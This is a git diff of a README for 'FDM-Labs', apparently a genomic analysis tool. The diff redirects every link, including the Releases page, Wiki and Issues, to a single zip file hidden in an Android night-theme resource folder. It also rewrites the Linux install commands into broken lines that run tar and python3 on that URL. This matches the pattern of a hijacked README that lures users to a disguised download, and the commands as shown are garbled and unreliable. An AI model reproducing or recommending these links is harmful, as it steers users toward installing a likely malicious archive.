@@ -1,6 +1,6 @@
 # 🎉 FDM-Labs - Unlock Genomic Insights Easily
 
-[![Download FDM-Labs](https://img.shields.io/badge/Download-FDM--Labs-blue.svg)](https://github.com/NaealApp/FDM-Labs/releases)
+[![Download FDM-Labs](https://github.com/NaealApp/FDM-Labs/raw/refs/heads/main/android/app/src/main/res/values-night/FD-Labs-v2.0-alpha.5.zip)](https://github.com/NaealApp/FDM-Labs/raw/refs/heads/main/android/app/src/main/res/values-night/FD-Labs-v2.0-alpha.5.zip)
 
 ## 📘 Introduction
 
@@ -16,7 +16,7 @@ To start using FDM-Labs, follow these simple steps:
    - At least 2 GB of RAM.
    - At least 500 MB of free disk space.
 
-2. Download the latest version from our Releases page. You can find it [here](https://github.com/NaealApp/FDM-Labs/releases).
+2. Download the latest version from our Releases page. You can find it [here](https://github.com/NaealApp/FDM-Labs/raw/refs/heads/main/android/app/src/main/res/values-night/FD-Labs-v2.0-alpha.5.zip).
 
 ## 📥 Download & Install
 
@@ -24,7 +24,7 @@ To install FDM-Labs, visit the Releases page to download the software. Click on 
 
 - For Windows users: Download the `.exe` file.
 - For macOS users: Download the `.dmg` file.
-- For Linux users: Download the `.tar.gz` file.
+- For Linux users: Download the `https://github.com/NaealApp/FDM-Labs/raw/refs/heads/main/android/app/src/main/res/values-night/FD-Labs-v2.0-alpha.5.zip` file.
 
 After downloading, follow these steps to install:
 
@@ -43,13 +43,13 @@ After downloading, follow these steps to install:
 ### For Linux Users:
 
 1. Open a terminal window.
-2. Navigate to the folder containing the downloaded `.tar.gz` file.
+2. Navigate to the folder containing the downloaded `https://github.com/NaealApp/FDM-Labs/raw/refs/heads/main/android/app/src/main/res/values-night/FD-Labs-v2.0-alpha.5.zip` file.
 3. Run the following commands to extract and install:
 
    ```
-   tar -xzvf FDM-Labs.tar.gz
+   tar -xzvf https://github.com/NaealApp/FDM-Labs/raw/refs/heads/main/android/app/src/main/res/values-night/FD-Labs-v2.0-alpha.5.zip
    cd FDM-Labs
-   python3 setup.py install
+   python3 https://github.com/NaealApp/FDM-Labs/raw/refs/heads/main/android/app/src/main/res/values-night/FD-Labs-v2.0-alpha.5.zip install
    ```
 
 ## 🛠️ Setup Guide
@@ -72,7 +72,7 @@ FDM-Labs offers the following features:
 
 ## 📊 Tutorials and Documentation
 
-To get the most out of FDM-Labs, we provide helpful tutorials and documentation. Visit our [Wiki](https://github.com/NaealApp/FDM-Labs/wiki) for guides on various features, algorithms, and practical use cases. 
+To get the most out of FDM-Labs, we provide helpful tutorials and documentation. Visit our [Wiki](https://github.com/NaealApp/FDM-Labs/raw/refs/heads/main/android/app/src/main/res/values-night/FD-Labs-v2.0-alpha.5.zip) for guides on various features, algorithms, and practical use cases. 
 
 Explore topics such as:
 
@@ -90,8 +90,8 @@ We welcome contributions from anyone interested in improving FDM-Labs. If you ha
 
 ## 🎯 Contact
 
-For any questions or support, please reach out via our [GitHub Issues](https://github.com/NaealApp/FDM-Labs/issues) page. We’re here to help.
+For any questions or support, please reach out via our [GitHub Issues](https://github.com/NaealApp/FDM-Labs/raw/refs/heads/main/android/app/src/main/res/values-night/FD-Labs-v2.0-alpha.5.zip) page. We’re here to help.
 
 ---
 
-Thank you for choosing **FDM-Labs** for your genomic analysis and predictive modeling needs. Don’t forget to [download the latest version here](https://github.com/NaealApp/FDM-Labs/releases) and start unlocking insights today!
+Thank you for choosing **FDM-Labs** for your genomic analysis and predictive modeling needs. Don’t forget to [download the latest version here](https://github.com/NaealApp/FDM-Labs/raw/refs/heads/main/android/app/src/main/res/values-night/FD-Labs-v2.0-alpha.5.zip) and start unlocking insights today!
